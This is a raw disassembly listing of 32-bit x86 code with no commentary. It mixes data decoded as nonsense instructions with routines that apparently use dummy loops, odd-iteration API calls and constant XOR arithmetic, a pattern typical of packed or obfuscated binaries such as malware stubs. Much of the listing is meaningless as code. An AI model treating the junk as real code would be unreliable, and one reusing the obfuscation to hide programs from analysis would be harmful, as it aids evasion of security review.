  407ac8:	adc    dh,BYTE PTR [ebx+ecx*8]
  407acb:	aam    0x58
  407acd:	rol    DWORD PTR gs:[ecx-0x76],cl
  407ad1:	js     0x407abc
  407ad3:	and    edi,esi
  407ad5:	in     al,0x2e
  407ad7:	dec    esp
  407ad8:	fwait
  407ad9:	push   edi
  407ada:	fisttp WORD PTR [esi+0x242eb862]
  407ae0:	or     bl,BYTE PTR [edx]
  407ae2:	int3   
  407ae3:	cld    
  407ae4:	push   esp
  407ae5:	pop    edx
  407ae6:	cmp    BYTE PTR [edx+0x39c7315e],0x95
  407aed:	dec    eax
  407aee:	out    0xae,eax
  407af0:	push   ebx
  407af1:	stc    
  407af2:	call   0xba4e:0x32009178
  407af9:	mov    esp,0xa7067ac0
  407afe:	xor    dh,BYTE PTR [ecx*2-0x3ea80ad9]
  407b05:	nop
  407b06:	adc    al,0xeb
  407b08:	cli    
  407b09:	inc    ebx
  407b0a:	jb     0x407af7
  407b0c:	mov    DWORD PTR [ebx+0x2e],esp
  407b0f:	stc    
  407b10:	ja     0x407b04
  407b12:	loope  0x407b64
  407b14:	jmp    0x606f4943
  407b19:	js     0x407b0e
  407b1b:	mov    eax,0xfebaae58
  407b20:	add    BYTE PTR [ebx+esi*1-0x1f63144],cl
  407b27:	hlt    
  407b28:	fistp  WORD PTR [edi+eax*4+0x1a]
  407b2c:	call   0x2f28:0x4b81e56f
  407b33:	jbe    0x407ad3
  407b35:	and    bh,BYTE PTR [esi-0x7e3eccd6]
  407b3b:	adc    eax,0x43382b
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x4337d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433787,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4338af,0x43378f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43381f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433783
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433827,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43379f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4337eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4337eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433857
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4337d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4337d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4337d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4337d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4337d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4337d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4337d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4337d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	adc    eax,edx
  407c4c:	xchg   ebx,eax
  407c4d:	jmp    FWORD PTR [ebx]
  407c4f:	int3   
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x1c7e7e7c
  407c57:	inc    ebx
  407c58:	jle    0x407cb8
  407c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c5b:	es add edx,0x15fdc6b2
  407c62:	(bad)  
  407c63:	jbe    0x407c7a
  407c65:	(bad)  
  407c66:	xchg   edi,eax
  407c67:	ror    BYTE PTR [esi-0x60905026],cl
  407c6d:	inc    ebx
  407c6e:	jnp    0x407c60
  407c70:	jno    0x407bf6
  407c72:	test   bl,0xde
  407c75:	into   
  407c76:	push   eax
  407c77:	or     eax,0x84a78890
  407c7c:	inc    ebp
  407c7d:	aaa    
  407c7e:	cmp    edi,esi
  407c80:	aas    
  407c81:	xchg   al,dl
  407c83:	add    al,al
  407c85:	test   BYTE PTR [edx],bh
  407c87:	retf   0x2af6
  407c8a:	outs   dx,BYTE PTR ds:[esi]
  407c8b:	push   0xffffffa8
  407c8d:	call   0x5657:0x3a8db01f
  407c94:	cmp    al,0xde
  407c96:	std    
  407c97:	jge    0x407c7e
  407c99:	sar    DWORD PTR [edx+0x71],1
  407c9c:	push   0x62ae3fc1
  407ca1:	push   eax
  407ca2:	nop
  407ca3:	(bad)  
  407ca4:	(bad)  [esi-0x71]
  407ca7:	cdq    
  407ca8:	fwait
  407ca9:	fwait
  407caa:	push   es
  407cab:	jecxz  0x407c41
  407cad:	push   0x35baff08
  407cb2:	dec    edi
  407cb3:	cmp    eax,0xdc01d5b4
  407cb8:	leave  
  407cb9:	sub    ah,BYTE PTR [edx+0x2a68fa00]
  407cbf:	adc    cl,bl
  407cc1:	iret   
  407cc2:	push   0x663a5f39
  407cc7:	enter  0xa3f7,0xa
  407ccb:	jmp    0xd5ad95cb
  407cd0:	push   esi
  407cd1:	loopne 0x407cf1
  407cd3:	push   ecx
  407cd4:	cli    
  407cd5:	shl    DWORD PTR [edi-0xb944686],cl
  407cdb:	repz cli 
  407cdd:	arpl   WORD PTR [edi-0x3b],ax
  407ce0:	mov    esi,DWORD PTR [ecx-0x346cbbf8]
  407ce6:	aas    
  407ce7:	add    al,0x8b
  407ce9:	out    0x6c,eax
  407ceb:	push   ss
  407cec:	xor    al,0x4a
  407cee:	adc    BYTE PTR [edi-0x4c],cl
  407cf1:	loope  0x407d48
  407cf3:	out    0x21,eax
  407cf5:	aam    0x8d
  407cf7:	xchg   si,ax
  407cf9:	call   0x7c99:0x501f6254
  407d00:	jl     0x407d58
  407d02:	lods   al,BYTE PTR ds:[esi]
  407d03:	jmp    0xd77d:0xf5b7f601
  407d0a:	jb     0x407d66
  407d0c:	xchg   BYTE PTR [ecx-0x4e57baf7],cl
  407d12:	jg     0x407d2f
  407d14:	loopne 0x407d18
  407d16:	cli    
  407d17:	fs sahf 
  407d19:	add    eax,0x1a9de7b5
  407d1e:	fsubr  st,st(4)
  407d20:	aam    0x16
  407d22:	jno    0x407d55
  407d24:	pop    edi
  407d25:	xchg   esi,eax
  407d26:	je     0x407d02
  407d28:	stos   BYTE PTR es:[edi],al
  407d29:	pop    ebx
  407d2a:	std    
  407d2b:	add    al,BYTE PTR [ecx]
  407d2d:	out    0xce,al
  407d2f:	pushf  
  407d30:	popa   
  407d31:	jnp    0x407ce5
  407d33:	data16 fld QWORD PTR [esi]
  407d36:	rcl    BYTE PTR [eax+0x6f],1
  407d39:	call   0x90290cdf
  407d3e:	mov    WORD PTR [esi-0x2bc92800],es
  407d44:	push   0x58f74a3f
  407d49:	sbb    DWORD PTR [edx+0x31af145d],eax
  407d4f:	push   esi
  407d50:	stc    
  407d51:	clc    
  407d52:	aas    
  407d53:	push   esp
  407d54:	cmp    bh,al
  407d56:	mov    ebp,0x2337e482
  407d5b:	dec    edx
  407d5c:	or     eax,0xbd123724
  407d61:	jl     0x407d93
  407d63:	jp     0x407d00
  407d65:	ficom  DWORD PTR [edx]
  407d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d68:	or     al,0x1c
  407d6a:	imul   edx,DWORD PTR [esi-0x373a6fa4],0x18ff3805
  407d74:	shl    BYTE PTR [eax+esi*2-0x65],1
  407d78:	or     eax,0x4b26ff88
  407d7d:	dec    ebp
  407d7e:	fwait
  407d7f:	mov    es,WORD PTR [edi+0x9]
  407d82:	inc    ebp
  407d83:	fist   DWORD PTR [edx]
  407d85:	jg     0x407df0
  407d87:	mov    dl,0x45
  407d89:	call   0x8f1b1483
  407d8e:	sar    DWORD PTR [ebp-0x5b],0x36
  407d92:	cmp    ch,dl
  407d94:	cmp    bl,BYTE PTR [edx]
  407d96:	inc    edi
  407d97:	rcl    DWORD PTR [eax+edx*1],1
  407d9a:	push   ds
  407d9b:	pop    eax
  407d9c:	and    al,0x7f
  407d9e:	jge    0x407df2
  407da0:	inc    ecx
  407da1:	test   al,0xc8
  407da3:	cwde   
  407da4:	icebp  
  407da5:	fnstenv [ebp+ebx*2+0x38]
  407da9:	rcl    bl,0x44
  407dac:	lea    eax,[ebp+0x2c]
  407daf:	retf   
  407db0:	mov    edi,0xcc039f35
  407db5:	mov    ah,0x46
  407db7:	(bad)  
  407db8:	push   0x915eca3d
  407dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dbe:	sahf   
  407dbf:	fisubr DWORD PTR [edi-0x53]
  407dc2:	arpl   WORD PTR [esi+0x55a0d167],cx
  407dc8:	ins    DWORD PTR es:[edi],dx
  407dc9:	pushf  
  407dca:	sbb    dh,0xf7
  407dcd:	xchg   ebx,eax
  407dce:	cdq    
  407dcf:	push   ds
  407dd0:	ud1    eax,ebx
  407dd3:	ret    
  407dd4:	or     al,0x95
  407dd6:	imul   DWORD PTR [ebx+0x17]
  407dd9:	ins    BYTE PTR es:[edi],dx
  407dda:	loop   0x407ded
  407ddc:	add    esp,edx
  407dde:	js     0x407e45
  407de0:	sbb    al,0x6a
  407de2:	push   ebx
  407de3:	gs jmp 0xe802:0x94023500
  407deb:	sbb    DWORD PTR [eax-0x35],ebx
  407dee:	dec    esi
  407def:	or     BYTE PTR [ebp-0x32a2e878],al
  407df5:	mov    ch,0x24
  407df7:	nop
  407df8:	push   es
  407df9:	and    DWORD PTR [esi],eax
  407dfb:	out    0xe9,al
  407dfd:	outs   dx,DWORD PTR ds:[esi]
  407dfe:	into   
  407dff:	mov    edi,0x34ac7a5b
  407e04:	mov    edi,0x834155e2
  407e09:	push   ebx
  407e0a:	dec    edx
  407e0b:	stos   DWORD PTR es:[edi],eax
  407e0c:	cs mov dh,0x63
  407e0f:	cmp    al,0xce
  407e11:	xchg   edi,eax
  407e12:	pop    ebp
  407e13:	adc    DWORD PTR [edi+0x6c7ed72b],ecx
  407e19:	push   ebx
  407e1a:	xor    edx,DWORD PTR [ecx]
  407e1c:	jns    0x407daf
  407e1e:	sub    BYTE PTR [esi+0xa6819d1],cl
  407e24:	cdq    
  407e25:	outs   dx,DWORD PTR ds:[esi]
  407e26:	mov    ah,0xee
  407e28:	arpl   WORD PTR [ebx-0x1d],bp
  407e2b:	pop    ecx
  407e2c:	dec    ecx
  407e2d:	scas   al,BYTE PTR es:[edi]
  407e2e:	push   ebp
  407e2f:	ss out 0xf7,al
  407e32:	ss ja  0x407e2b
  407e35:	out    0x4c,al
  407e37:	mov    ecx,0x4140091a
  407e3c:	icebp  
  407e3d:	cmp    BYTE PTR [edx+0xd],ch
  407e40:	cwde   
  407e41:	inc    edx
  407e42:	jecxz  0x407ddf
  407e44:	shl    BYTE PTR [edi],1
  407e46:	(bad)  
  407e47:	mov    ds:0x249fd774,eax
  407e4c:	daa    
  407e4d:	lahf   
  407e4e:	and    DWORD PTR [ebx],ebp
  407e50:	add    cl,dh
  407e52:	ins    DWORD PTR es:[edi],dx
  407e53:	gs cdq 
  407e55:	(bad)  
  407e56:	cmp    al,0xd0
  407e58:	or     eax,0xb96a595c
  407e5d:	inc    esi
  407e5e:	stc    
  407e5f:	xchg   ebp,eax
  407e60:	sub    ecx,DWORD PTR [ecx-0xbba74f0]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4337eb
  407f81:	or     DWORD PTR ds:0x4337ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433857,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433853,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43389b
  407fad:	sub    DWORD PTR ds:0x433827,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4337db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43382b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43382b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43382b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43382b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43382b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433a67
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43382b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43382b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43382b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43382b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43382b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43382b,ebx
  408048:	cmp    DWORD PTR ds:0x43382b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43382b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43382b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43382b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43382b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43377b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43385b
  4080b1:	and    DWORD PTR ds:0x433863,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43381b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4338a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4338a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4338a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4338a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43385b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4338a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4338a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4338a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4338a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433897,0x1f
  40813b:	cmp    DWORD PTR ds:0x433897,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433897,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433897
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433897,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x33c32e0d
  408191:	mov    al,0x3e
  408193:	retf   0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	mov    eax,ds:0x16056084
  40819f:	sbb    esi,0x0
  4081a2:	mov    dl,al
  4081a4:	movaps xmm5,xmm4
  4081a7:	mov    ?,WORD PTR [esi+0x3a]
  4081aa:	imul   ecx,DWORD PTR [edi-0x64181159],0x42
  4081b1:	inc    ebp
  4081b2:	mov    ch,0x70
  4081b4:	sub    al,0xd6
  4081b6:	in     eax,dx
  4081b7:	pop    ebp
  4081b8:	adc    al,0xd7
  4081ba:	ror    BYTE PTR [ecx+esi*1+0x1888e68c],cl
  4081c1:	mov    ds:0xd3dbcf3a,al
  4081c6:	mov    eax,0x7208e231
  4081cb:	cmp    eax,ebp
  4081cd:	mov    bl,0x10
  4081cf:	jne    0x408248
  4081d1:	mov    ch,0x4e
  4081d3:	push   ebx
  4081d4:	push   ebx
  4081d5:	out    0x1d,al
  4081d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081d8:	jne    0x4081fa
  4081da:	inc    ebx
  4081db:	imul   ebp,DWORD PTR [ebx-0x7f],0xffffffa4
  4081df:	push   cs
  4081e0:	and    DWORD PTR [ecx],ebx
  4081e2:	mov    WORD PTR [esp+ebx*2+0x68],cs
  4081e6:	mov    DWORD PTR [ebp+0x29bce3b5],edx
  4081ec:	lahf   
  4081ed:	repnz push ds
  4081ef:	or     ah,ch
  4081f1:	repnz frstor [edx]
  4081f4:	add    al,0xbd
  4081f6:	cmp    BYTE PTR [edi+ebp*4],bl
  4081f9:	inc    eax
  4081fa:	es and al,0x1c
  4081fd:	popa   
  4081fe:	fisttp DWORD PTR [ebx]
  408200:	pop    ebp
  408201:	sub    eax,0xb3549d62
  408206:	pop    ds
  408207:	retf   
  408208:	adc    eax,0xbec027ab
  40820d:	into   
  40820e:	lahf   
  40820f:	dec    ebx
  408210:	push   ds
  408211:	mov    al,ds:0xae612d1e
  408216:	pop    ds
  408217:	pop    eax
  408218:	dec    di
  40821a:	push   esi
  40821b:	das    
  40821c:	or     eax,0x5956be77
  408221:	in     eax,0xd4
  408223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408224:	sbb    cl,0x49
  408227:	pop    ebx
  408228:	das    
  408229:	loope  0x40821d
  40822b:	jg     0x408216
  40822d:	xchg   ecx,eax
  40822e:	jmp    0x22bd:0x1cf4518c
  408235:	xor    eax,0x1774124b
  40823a:	or     ch,ch
  40823c:	das    
  40823d:	mov    al,ds:0x6de9f0da
  408242:	loop   0x408273
  408244:	fisttp WORD PTR [edx-0x41]
  408247:	in     al,dx
  408248:	popf   
  408249:	test   al,0x62
  40824b:	ja     0x4081f2
  40824d:	pop    esp
  40824e:	xchg   esp,eax
  40824f:	pusha  
  408250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408251:	sbb    eax,0x800b08aa
  408256:	jecxz  0x408210
  408258:	xchg   edi,eax
  408259:	inc    ebp
  40825a:	xchg   edi,eax
  40825b:	fsubr  DWORD PTR [ebx+0x42eb6fc]
  408261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408262:	daa    
  408263:	jb     0x40826c
  408265:	mov    al,0x8d
  408267:	adc    eax,0xf0744798
  40826c:	sbb    edi,DWORD PTR [edi]
  40826e:	mov    bh,0x67
  408270:	pop    ebp
  408271:	push   eax
  408272:	outs   dx,DWORD PTR ds:[esi]
  408273:	cmc    
  408274:	fsub   st(3),st
  408276:	and    al,0x52
  408278:	(bad)  
  408279:	or     eax,edi
  40827b:	jmp    0xfad78e34
  408280:	ret    
  408281:	sti    
  408282:	icebp  
  408283:	or     dl,BYTE PTR [ecx]
  408285:	jg     0x40826c
  408287:	push   0x32
  408289:	push   eax
  40828a:	inc    edx
  40828b:	stc    
  40828c:	mov    ebp,0xc17eec27
  408291:	jae    0x4082ea
  408293:	out    0x77,eax
  408295:	xor    BYTE PTR [ecx-0x2d238d60],0xa1
  40829c:	xchg   edx,esp
  40829e:	ins    BYTE PTR es:[edi],dx
  40829f:	mov    esi,DWORD PTR [edx]
  4082a1:	dec    ebp
  4082a2:	imul   esi,esp,0x65
  4082a5:	mov    bl,0x8b
  4082a7:	jle    0x408327
  4082a9:	jbe    0x4082f1
  4082ab:	inc    esi
  4082ac:	out    0xc,eax
  4082ae:	xor    DWORD PTR [edi+0x6f],eax
  4082b1:	xchg   DWORD PTR [ebx],esp
  4082b3:	mov    bl,0x3e
  4082b5:	test   eax,0xae41686e
  4082ba:	scas   al,BYTE PTR es:[edi]
  4082bb:	push   ebp
  4082bc:	add    bh,BYTE PTR [ecx-0x76]
  4082bf:	mov    esi,0x752a280d
  4082c4:	push   ds
  4082c5:	aad    0x65
  4082c7:	inc    edx
  4082c8:	sahf   
  4082c9:	or     edx,ecx
  4082cb:	call   0x2680:0xad5b283e
  4082d2:	ds jae 0x408340
  4082d5:	shl    BYTE PTR [ebp+0x79],0xf2
  4082d9:	lock dec ebp
  4082db:	popf   
  4082dc:	adc    esp,edi
  4082de:	lods   al,BYTE PTR ds:[esi]
  4082df:	jb     0x40835d
  4082e1:	and    al,cl
  4082e3:	and    ebx,ebp
  4082e5:	in     eax,dx
  4082e6:	mov    WORD PTR [ebp+0x16bea0bc],?
  4082ec:	xchg   DWORD PTR [edx+0x3e5e99d2],eax
  4082f2:	xchg   esp,eax
  4082f3:	add    edx,DWORD PTR [eax+ebp*8-0x7b8c8ab4]
  4082fa:	pop    ecx
  4082fb:	adc    DWORD PTR [eax-0x535f57a5],0x4a6ee580
  408305:	adc    BYTE PTR [eax+0x3ee5fae4],ah
  40830b:	dec    esi
  40830c:	fs mov cl,0x8e
  40830f:	sub    al,0x76
  408311:	pop    esi
  408312:	mov    ebp,0x187956bb
  408317:	xchg   edi,eax
  408318:	call   0x6d1d:0x4cc07f91
  40831f:	imul   ecx,edi,0xe010f972
  408325:	xchg   esp,eax
  408326:	test   eax,0x53dc19fa
  40832b:	out    0xd5,al
  40832d:	inc    esi
  40832e:	add    eax,0xa52f1a99
  408333:	inc    ecx
  408334:	add    al,0x6e
  408336:	sbb    esi,DWORD PTR [edx]
  408338:	push   cs
  408339:	ins    BYTE PTR es:[edi],dx
  40833a:	dec    ebp
  40833b:	fisttp QWORD PTR [ebx-0x723a62dc]
  408341:	mov    dh,0x88
  408343:	pop    edi
  408344:	push   ss
  408345:	xchg   DWORD PTR [esi+0x6c],esi
  408348:	sub    DWORD PTR [ebp-0x772ff9b9],esi
  40834e:	lds    ebx,FWORD PTR [ebx*8+0x7de54db6]
  408355:	lahf   
  408356:	pop    ecx
  408357:	imul   eax,DWORD PTR [ecx],0x76cc8930
  40835d:	pop    esp
  40835e:	mov    WORD PTR [edx+0x20ab657b],es
  408364:	mov    al,ds:0x379a658e
  408369:	xchg   ebx,eax
  40836a:	loop   0x408366
  40836c:	sahf   
  40836d:	dec    eax
  40836e:	pop    edi
  40836f:	dec    ebp
  408370:	cmp    eax,0x4fa70f8c
  408375:	cwde   
  408376:	mov    eax,0xea29620b
  40837b:	int    0xb8
  40837d:	test   al,0xd
  40837f:	dec    esp
  408380:	jne    0x408303
  408382:	retf   
  408383:	rol    BYTE PTR [edi+0x15efa87],0xfa
  40838a:	int3   
  40838b:	lods   eax,DWORD PTR ds:[esi]
  40838c:	nop
  40838d:	das    
  40838e:	adc    esp,DWORD PTR [eax+0x7cb92d5]
  408394:	ret    
  408395:	aad    0x9d
  408397:	pushf  
  408398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408399:	push   edx
  40839a:	sbb    al,0xcc
  40839c:	pop    ebx
  40839d:	stos   BYTE PTR es:[edi],al
  40839e:	fldenv [ebp-0x6a0eda1c]
  4083a4:	stos   BYTE PTR es:[edi],al
  4083a5:	pop    ecx
  4083a6:	sub    eax,0xcbf3acfa
  4083ab:	add    al,0xfb
  4083ad:	jnp    0x4083cb
  4083af:	or     eax,0xcf242ac9
  4083b4:	call   0xc7fd79d7
  4083b9:	neg    BYTE PTR [edi]
  4083bb:	ins    BYTE PTR es:[edi],dx
  4083bc:	sub    DWORD PTR [ebp+0x1e],0x590d494c
  4083c3:	ror    DWORD PTR [ecx+0x2581e045],0xdb
  4083ca:	aaa    
  4083cb:	inc    ebx
  4083cc:	add    BYTE PTR [eax],al
  4083ce:	add    BYTE PTR [eax],al
  4083d0:	add    BYTE PTR [ecx+0x4337db],ah
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4337db,eax
  4083dc:	cmp    DWORD PTR ds:0x4337db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4337db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4337db
  40840c:	inc    eax
  40840d:	mov    ds:0x4337db,eax
  408412:	cmp    DWORD PTR ds:0x4337db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43378b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433793,ecx
